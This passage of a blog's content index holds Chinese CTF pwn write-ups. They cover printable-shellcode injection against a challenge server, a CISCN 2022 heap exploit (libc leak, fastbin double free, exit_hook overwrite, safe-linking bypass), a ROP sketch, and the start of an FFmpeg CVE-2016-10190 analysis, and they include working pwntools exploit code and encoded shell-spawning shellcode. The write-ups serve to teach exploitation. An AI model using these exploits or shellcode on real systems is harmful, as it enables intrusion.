src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.49.50.png\" alt=\"截屏2022-05-29 下午6.49.50\"></p>\n<p>这里对我们输入的msg字符串进行了过滤，也就是shellcode必须为可见字符串。之前做过类似的题，可以直接使用工具生成。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.51.22.png\" alt=\"截屏2022-05-29 下午6.51.22\"></p>\n<p>这里使用<a href=\"https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后\">https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ae64 <span class=\"keyword\">import</span> AE64</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./login&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">obj = AE64()</span><br><span class=\"line\">sc = obj.encode(asm(shellcraft.sh()),<span class=\"string\">&#x27;rdx&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(sc)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    即可生成shellcode。</p>\n<p>最后的exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;59.110.24.117&quot;</span>,<span class=\"number\">12587</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;opt:1\\nmsg:ro0t\\r\\n&quot;</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt;&gt;&gt; &quot;</span>,payload1)</span><br><span class=\"line\">shellcode = <span class=\"string\">b&quot;RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&quot;</span></span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;opt:2\\nmsg:&quot;</span> + shellcode + <span class=\"string\">b&quot;\\r\\n&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(disasm(shellcode))</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt;&gt;&gt; &quot;</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - Shellcode"]},{"title":"newest_note","url":"/2022/06/11/ciscn_2022_newest_note/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-unlowVqP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>\n<p>给分享会准备的一个简单的复现。</p>\n<h2><span id=\"太长不看\">太长不看</span></h2><ol>\n<li>逆向确定漏洞点-uaf以及越界读写</li>\n<li>glibc2.32指针异或绕过</li>\n<li>glibc2.34取消malloc free hook后的利用方式</li>\n</ol>\n<h2><span id=\"check\">check</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%883.35.04.png\" alt=\"截屏2022-06-11 下午3.35.04\"></p>\n<p>​        依旧是保护全开。这里比较不好的地方就是libc的版本比较高。2.34有一个众所周知的更新就是去掉了<code>malloc_hook</code>以及<code>free_hook</code>。所以劫持程序流的方式也不再是从前的无脑打hook了。像湖湘杯的house of emma是利用fsop，有的题也可以找到exit hook来打。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%883.36.09.png\" alt=\"截屏2022-06-11 下午3.36.09\"></p>\n<h2><span id=\"逆向\">逆向</span></h2><p>​        这个题的程序逻辑还是很清晰。大致讲一下就是</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.06.19.png\" alt=\"截屏2022-06-11 下午4.06.19\"></p>\n<p>​        开始可以先申请一个几乎无大小限制的堆，然后初始化为0。这里事实上是存在漏洞的，但是放在后面讲。</p>\n<p>​        然后进入菜单，整体只有三个功能，增删查，经典没有改。每个功能看一下。</p>\n<h3><span id=\"add\">add</span></h3><p>​        这里需要我们自己指定的是idx而不是size，而idx最大不能超过我们开头输的那个idx，同时也不能小于0，这里规避了负数下标的情况，但依然可能存在越界读取。具体原因稍后分析。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.05.38.png\" alt=\"截屏2022-06-11 下午4.05.38\"></p>\n<p>​        具体看一下这里的申请流程。首先在<code>ptr+8*idx</code>上申请一个0x30大小的堆空间，相当于在<code>ptr+8*idx</code>这个地址保存了这个0x30 chunk的指针。接着idx2自减，这里暂时不清楚idx2是多少。这个地方的逻辑详细解释就是idx是八字节，8<em>8就是64字节，也就是一个0x40的空间。通过ptr+8 </em> idx的方式来索引申请chunk的地址。</p>\n<p>​        然后输入chunk的内容。也比较清楚。随便动调一下确认一下结构。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">40</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.26.03.png\" alt=\"截屏2022-06-11 下午4.26.03\"></p>\n<p>​        看起来非常的正常。继续下一个功能。</p>\n<h3><span id=\"show\">show</span></h3><p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.39.22.png\" alt=\"截屏2022-06-11 下午4.39.22\"></p>\n<p>​        这里的逻辑与add大同小异，不详细解释了，有一个需要注意的点就是可以看到打印只有一个idx合法性的检查，所以这里只要idx在范围内，无论指向的东西是不是真实的chunk内容都可以打印出来，这也就是这个题很关键的一个漏洞，越界读。（每年国赛都来）</p>\n<h3><span id=\"free\">free</span></h3><p>​        这个代码稍微长一点点。首先还是一个idx合法性检查，然后free 指向chunk内容的指针，不过说实话第一次看没看懂这个if是干啥的。限制free次数？那那个提取低字有何意义？先不管这个。</p>\n<p>​        不过很显然这里有uaf。</p>\n<h2><span id=\"利用\">利用</span></h2><p>​        总结一下逆向过程中发现的漏洞点以及疑点。</p>\n<p>​        首先就是free的uaf，简单直白，这个点的利用涉及到后面的任意地址写。</p>\n<p>​        其次是idx的大小可以自由规定，相当于一个越界读写。比如我们在设置idx值的时候设置为一个特别大的数，比如说0x20000000，那么这个size肯定已经需要mmap来申请libc上的地址了，所以这时候ptr实际是一个libc的偏移基准值，我们就可以通过show出构造好的idx来leak libc。此外也正是因为这里idx_max特别大，所以三个功能中对于idx的合法性检测基本都可以无视。</p>\n<p>​        所以这里第一步就是leak libc。</p>\n<h3><span id=\"leak-libc\">leak libc</span></h3><p>​        为了确定思路的合理性，先测试一下。</p>\n<p>确实能够打印出东西，那么这里我们需要了leak libc。所以需要选择一个位于libc，但内容也为libc地址的地址，种类我们选择<code>main_arena</code>。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%888.46.24.png\" alt=\"截屏2022-06-11 下午8.46.24\"></p>\n<p>​        关于main_arena的偏移如何找，可以直接将libc用ida打开，找到<code>malloc_trim</code>函数，然后</p>\n<p>​        （偷图）        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%888.55.43.png\" alt=\"截屏2022-06-11 下午8.55.43\">`</p>\n<p>​        这里的偏移是<code>0x218C60</code>。</p>\n<p>​        但是加上偏移以后实际地址对应的值是0，但是下面一片地址倒是有值，干脆就用他们来计算了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">off1 = <span class=\"number\">0x7ffff7fa9ce0</span>-<span class=\"number\">0x7ffff7b8d000</span></span><br><span class=\"line\">off2 = <span class=\"number\">0x7ffff7fa9ce0</span>-<span class=\"number\">0x7ffff7d91000</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;A small notebook keeps everything&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;How many pages your notebook will be? :&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0x20040000</span>))</span><br><span class=\"line\">show(off1/<span class=\"number\">8</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">libcbase = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - off2 + <span class=\"number\">0x10</span>   </span><br><span class=\"line\">system = libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n<p>​        确实有用。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%888.57.35.png\" alt=\"截屏2022-06-11 下午8.57.35\"></p>\n<p>​        那么接下来就是指针的利用了</p>\n<h3><span id=\"double-free构造任意地址写\">double free构造任意地址写</span></h3><p>​    （ps：由于没有找到靠谱的libc所以现在正在编译，编译未完成前就嗯看了）</p>\n<p>​        首先因为uaf，所以我们能够方便地打印出free chunk的fd和bk，这里就能先leak 一个heap base。接着我们想要实现的是一个任意地址写，这里其实和glibc版本没有太大的关系，因为堆块读写的条件其实已经很好了，uaf的品相也非常之上佳，并且由于size都是限定为0x30，所以也不用考虑乱七八糟的size问题，所以这里往简单的方向想，一个思路是tcache dup，另一个是fastbin dup。</p>\n<p>​        需要明确的是这个题并没有edit，所以不管是fastbin还是tcache bin都需要利用排堆构造double free来实现修改fd，但是如果是tcache dup的话，double free首先还需要改key，这就与我们的初衷相矛盾了，所以这里优先考虑fastbin 的思路，其实也就是一个2.29下的fastbin double。</p>\n<p>​        既然是fastbin double free，我们肯定先要拿到fastbin，所以需要先把tcache填一填。然后将第七第八个chunk放入fastbin，double free一下构成循环链表，再将tcache拿出来，然后申请刚刚double free的fastbin，进行任意地址写，思路非常简单清晰。</p>\n<p>​        这里唯一需要考虑的就是任意地址写的目标地址，如果是其他版本直接无脑打malloc hook或者free hook就好了，但是这里没有。</p>\n<p>​        fsop的话太过于小题大做了（我暂时也不是很会house of emma那个），可以考虑直接打exit hook。</p>\n<p>​        这里由于实在太板子了，我就直接copy exp了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">        add(i,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">6</span>):</span><br><span class=\"line\">        free(i)<span class=\"comment\"># fill tcache</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)<span class=\"comment\">#tcahce 1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">heapbase = u64(p.recv(<span class=\"number\">5</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))  </span><br><span class=\"line\">heapbase=heapbase&lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">7</span>)<span class=\"comment\">#fastbin -&gt;7</span></span><br><span class=\"line\">free(<span class=\"number\">8</span>)<span class=\"comment\">#-&gt;8-&gt;7</span></span><br><span class=\"line\">free(<span class=\"number\">7</span>)<span class=\"comment\">##-&gt;7-&gt;8-&gt;7,double free</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        add(i,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#tcache</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">7</span>,p64(exit))</span><br><span class=\"line\">add(<span class=\"number\">7</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">7</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">7</span>,p64(onegadget)*<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<h3><span id=\"exit_hook劫持\">exit_hook劫持</span></h3><p>​        exit hook的劫持之前倒是没有接触很多，毕竟有malloc 谁打这个。</p>\n<p>​        在这里算是一个新知识了。这个东西并不像是malloc hook或者free hook那样可以直接简单地通过libc base加一个简单的偏移找到。由于调用它的层级比较多，所以需要一层一层地寻找。</p>\n<p>​        libc还在编译，没有符号的话不太好找，先看原理。</p>\n<p>​        由于在libc2.31后这个东西发生了较大改变，所以分类讨论。</p>\n<p>2.31前可以直接套公式，exit hook是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">libc-2.23 : 0×5f0040+3848 </span><br><span class=\"line\">libc-2.27 : 0×61b060 + 3840</span><br></pre></td></tr></table></figure>\n<p>2.31后</p>\n<p><code>libc2.31 9.2</code>下偏移为0x1ED608</p>\n<p>libc2.31 9.7只能利用fsop。</p>\n<p>而这里其实与2，31后9.2的情况类似，对应libc段是可写的。</p>\n<p>其他情况的原理就不分析了，这里主要看一下当前libc的exit hook 。</p>\n<p>其实也是通过<code>__run_exit_handlers</code>调用<code>__libc_atexit</code>中的函数，而<code>__libc_atexit</code>是libc中的一个段，所以可以找到对应的偏移。</p>\n<p>这里我寻找的方式是ida,偏移为0x21A6C8。具体方式是通过搜索定位到<code>fpclose</code>-&gt;<code>fpclose(0)</code>，找到后者对应的偏移。</p>\n<p>注意到这里偏移为0x21A6C8，但是实际exp编写的时候是0x21A6C0。有一个八字节的偏差。这里其实就是一个16字节对齐的问题，如果是c8就会报错，所以改成c0，这里随便怎么改其实只要对齐然后不要差得超过0x30就行。比如c8 -0x10 ，然后多来几个个onegadget效果也是一样的。</p>\n<p>这里具体的原理就不介绍了，感兴趣可以去搜一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%8810.39.07.png\" alt></p>\n<h3><span id=\"指针异或\">指针异或</span></h3><p>最后这里还要注意一个点。就是glibc2.32的指针异或。</p>\n<blockquote>\n<p>​    glibc2.32引入的新的防御机制-<strong>safe-linking</strong>(异或<a href=\"https://so.csdn.net/so/search?q=加密&amp;spm=1001.2101.3001.7020\">加密</a>),其核心思想是:将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或,该操作是在chunk被放入tcache bin和从tcache bin中取出时进行。</p>\n</blockquote>\n<p>也就是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PROTECT_PTR(pos, ptr) \\</span></span><br><span class=\"line\"><span class=\"meta\">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>\n<p>所以当我们构造fd的时候，要考虑到后面程序会对这个指针进行一个相当于解密的工作，所以我们填进去的fd内容也需要是被加密的，即fd的地址右移再异或fd本身，这里fd的地址再右移可以直接用堆基址来处理，然后异或system地址就好了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">target = ((heapbase)&gt;&gt;<span class=\"number\">12</span>)^(libcbase+off3)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/\">http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-273101.htm\">https://bbs.pediy.com/thread-273101.htm</a></p>\n<p><a href=\"https://blog.csdn.net/qq_40712959/article/details/115696356\">https://blog.csdn.net/qq_40712959/article/details/115696356</a></p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"pwn1（已弃）","url":"/2022/07/08/ciscn_2022_pwn1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-JXbUFuhf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>一个简单的复建，题目是今年西南赛区pwn1，是一个很常规的栈的rop，套了orw。</p>\n<h2><span id=\"逆向\">逆向</span></h2><p>​        这个题的逆向不算复杂，同样也是操作符控制指令的形式，输多少个操作符就执行多少次指令，具体的过程就不写了。</p>\n<p>​        操作符对应的指令如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#1 --&gt; &gt;\t[++buf_idx]</span></span><br><span class=\"line\"><span class=\"comment\">#2 --&gt; &lt;\t[--buf_idx]\t</span></span><br><span class=\"line\"><span class=\"comment\">#3 --&gt; +\t[++buf[buf_idx]]</span></span><br><span class=\"line\"><span class=\"comment\">#4 --&gt; -\t[--buf[buf_idx]]</span></span><br><span class=\"line\"><span class=\"comment\">#5 --&gt; .\t[write(1, &amp;buf[buf_idx], 1uLL)]</span></span><br><span class=\"line\"><span class=\"comment\">#6 --&gt; ,\t[getchar]</span></span><br><span class=\"line\"><span class=\"comment\">#7 --&gt; [\t[idx = word_4042[2 * idx];]</span></span><br><span class=\"line\"><span class=\"comment\">#8 --&gt; ]\t[idx = word_4042[2 * idx];]</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​            因为题目给我们提供了写和读的操作，并且还能够控制idx，那么很显然这又是一道越界读写。</p>\n<p>​        由于有沙箱，所以直接考虑rop+orw，这一段不算太复杂，只需要找对地址套板子。</p>\n<h2><span id=\"利用\">利用</span></h2><p>​        大体的思路就是利用越界读leak，再用越界写将返回地址改为rop链。看起来非常简单，但是还是有很多细节需要注意。由于是栈上orw，首先读入flag的地址需要被leak，这就要求我们leak libc和stack。</p>\n<p>​        首先leak libc。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-08%20%E4%B8%8B%E5%8D%882.28.17.png\" alt=\"截屏2022-07-08 下午2.28.17\"></p>\n<p>​        buf是一个栈上的数组。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-08%20%E4%B8%8B%E5%8D%882.28.28.png\" alt=\"截屏2022-07-08 下午2.28.28\"></p>\n<p>​        这里则打印对应栈上的数据，每次只读1个字节。</p>\n<p>​        呜呜，现在我的旁边有一只猫猫，猫猫在看我打字。</p>\n<p>​        不是很想做了，就这样吧，真的不喜欢这种无聊栈题。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - ROP"]},{"title":"cve-2016-10190分析","url":"/2022/09/14/cve-2016-10190/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PScWukxv\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>米版阉割，原文加上代码将近3w字，这里就随便挑一点重点放上来。而且图懒得搞了，就当记录一下。</p>\n<h4><span id> </span></h4><h2><span id=\"环境搭建\">环境搭建</span></h2><p>首先下载源码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/FFmpeg/FFmpeg/archive/n3.2.1.tar.gz</span><br></pre></td></tr></table></figure>\n<h4><span id=\"4-ffmpeg编译\">4） ffmpeg编译</span></h4><p>按照<a href=\"https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu，安装编译相关依赖\">https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu，安装编译相关依赖</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update -qq &amp;&amp; sudo apt-get -y install \\</span><br><span class=\"line\">  autoconf \\</span><br><span class=\"line\">  automake \\</span><br><span class=\"line\">  build-essential \\</span><br><span class=\"line\">  cmake \\</span><br><span class=\"line\">  git-core \\</span><br><span class=\"line\">  libass-dev \\</span><br><span class=\"line\">  libfreetype6-dev \\</span><br><span class=\"line\">  libgnutls28-dev \\</span><br><span class=\"line\">  libmp3lame-dev \\</span><br><span class=\"line\">  libsdl2-dev \\</span><br><span class=\"line\">  libtool \\</span><br><span class=\"line\">  libva-dev \\</span><br><span class=\"line\">  libvdpau-dev \\</span><br><span class=\"line\">  libvorbis-dev \\</span><br><span class=\"line\">  libxcb1-dev \\</span><br><span class=\"line\">  libxcb-shm0-dev \\</span><br><span class=\"line\">  libxcb-xfixes0-dev \\</span><br><span class=\"line\">  meson \\</span><br><span class=\"line\">  ninja-build \\</span><br><span class=\"line\">  pkg-config \\</span><br><span class=\"line\">  texinfo \\</span><br><span class=\"line\">  wget \\</span><br><span class=\"line\">  yasm \\</span><br><span class=\"line\">  zlib1g-dev</span><br></pre></td></tr></table></figure>\n<h5><span id=\"编译\">编译:</span></h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./configure --prefix=<span class=\"string\">&quot;./build&quot;</span> --bindir=<span class=\"string\">&quot;./bin&quot;</span> \\</span><br><span class=\"line\">  --disable-stripping </span><br><span class=\"line\">make -j 4</span><br></pre></td></tr></table></figure>\n<h2><span id=\"漏洞复现\">漏洞复现</span></h2><h4><span id=\"exp1尝试造成程序崩溃\">exp1（尝试造成程序崩溃）</span></h4><p>编写exp1，保存至<code>exp1.py</code>文件。</p>\n<p>在ffmpeg可执行文件所在文件夹运行该exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 exp1.py </span><br></pre></td></tr></table></figure>\n<p>此时再开启一个终端，在相同路径输入命令行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./ffmpeg -i http://127.0.0.1:12345 test.avi</span><br></pre></td></tr></table></figure>\n<p>可以看到触发程序崩溃。</p>\n<h2><span id=\"源码分析\">源码分析</span></h2><p>源码版本： Ffmpeg 3.2.1</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/FFmpeg/FFmpeg/archive/n3.2.1.tar.gz</span><br></pre></td></tr></table></figure>\n<p>漏洞发生在处理请求的http服务器端的http响应时。</p>\n<p>对应代码段如下：</p>\n<p><code>libavformat/http.c/:1235</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1235</span> <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">http_read_stream</span><span class=\"params\">(URLContext *h, <span class=\"keyword\">uint8_t</span> *buf, <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\">1236 </span>&#123;</span><br><span class=\"line\"><span class=\"comment\">//HTTPContext *s结构体含有int64_t字段chunksize，该字段为有符号整数。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1250</span>     <span class=\"keyword\">if</span> (s-&gt;chunksize &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"number\">1251</span>         <span class=\"keyword\">if</span> (!s-&gt;chunksize) &#123;</span><br><span class=\"line\"><span class=\"number\">1252</span>             <span class=\"keyword\">char</span> line[<span class=\"number\">32</span>];</span><br><span class=\"line\"><span class=\"number\">1253</span></span><br><span class=\"line\"><span class=\"number\">1254</span>                 <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\"><span class=\"number\">1255</span>                     <span class=\"keyword\">if</span> ((err = http_get_line(s, line, <span class=\"keyword\">sizeof</span>(line))) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"number\">1256</span>                         <span class=\"keyword\">return</span> err;</span><br><span class=\"line\"><span class=\"number\">1257</span>                 &#125; <span class=\"keyword\">while</span> (!*line);    <span class=\"comment\">/* skip CR LF from last chunk */</span></span><br><span class=\"line\"><span class=\"number\">1258</span></span><br><span class=\"line\"><span class=\"number\">1259</span>                 s-&gt;chunksize = strtoll(line, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1264</span>                 <span class=\"keyword\">if</span> (!s-&gt;chunksize)</span><br><span class=\"line\"><span class=\"number\">1265</span>                     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"number\">1266</span>         &#125;</span><br><span class=\"line\"><span class=\"number\">1267</span>         size = FFMIN(size, s-&gt;chunksize);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1273</span>     read_ret = http_buf_read(h, buf, size);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1295</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>首先需要注意结构体<code>HTTPContext</code>含有类型为<code>int64_t</code>的字段chunksize，该字段为有符号整数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1237</span>     HTTPContext *s = h-&gt;priv_data;</span><br></pre></td></tr></table></figure>\n<p>接着从http流中读取chunk size，将其储存在上方定义的char类型变量<code>line</code>中。                 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1251</span>         <span class=\"keyword\">if</span> (!s-&gt;chunksize) &#123;</span><br><span class=\"line\"><span class=\"number\">1252</span>             <span class=\"keyword\">char</span> line[<span class=\"number\">32</span>];</span><br><span class=\"line\"><span class=\"number\">1253</span></span><br><span class=\"line\"><span class=\"number\">1254</span>                 <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\"><span class=\"number\">1255</span>                     <span class=\"keyword\">if</span> ((err = http_get_line(s, line, <span class=\"keyword\">sizeof</span>(line))) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"number\">1256</span>                         <span class=\"keyword\">return</span> err;</span><br></pre></td></tr></table></figure>\n<p>接着使用<code>strtoll</code>函数将<code>line</code>变量转化为<code>long long</code>类型的有符号整数，并保存在<code>s-&gt;chunksize</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1259</span>                 s-&gt;chunksize = strtoll(line, <span class=\"literal\">NULL</span>, <span 